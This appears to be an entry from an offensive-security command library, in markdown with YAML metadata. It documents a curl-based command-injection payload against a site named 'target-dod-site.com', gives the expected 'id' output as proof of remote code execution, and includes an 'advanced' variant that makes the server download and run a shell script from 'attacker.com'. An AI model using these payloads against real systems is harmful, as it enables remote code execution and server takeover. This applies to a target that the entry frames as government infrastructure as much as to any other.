---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: 'curl "https://target-dod-site.com/search?q=; id"'
tags:
  - rce
  - injection
type: command
output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:23.845Z'
verified: false
validated: true
submitted: true
---
# curl-inject-command

## Command

```bash
curl "https://target-dod-site.com/search?q=; id"
```

## Description

This command uses curl to send an HTTP request with a code injection payload to a vulnerable web parameter, attempting to execute the `id` command on the server and return its output in the response. Useful for testing RCE in code injection scenarios on web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with vulnerable parameter | Yes |
| `q=; id` | Injection payload (semicolon to chain commands, `id` to test execution) | Yes |

## Examples

### Basic Usage

```bash
curl "https://target-dod-site.com/search?q=; id"
```

### Advanced Usage

```bash
curl -v "https://target-dod-site.com/search?q=; wget http://attacker.com/shell.sh && bash shell.sh" --output response.txt
```

## Expected Output

The HTTP response body includes the output of the executed command, such as `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, indicating successful server-side execution. Errors may show if injection fails.

## Related

- [[Related Procedure: Exploit-Code-Injection-RCE-on-Web-Server]]
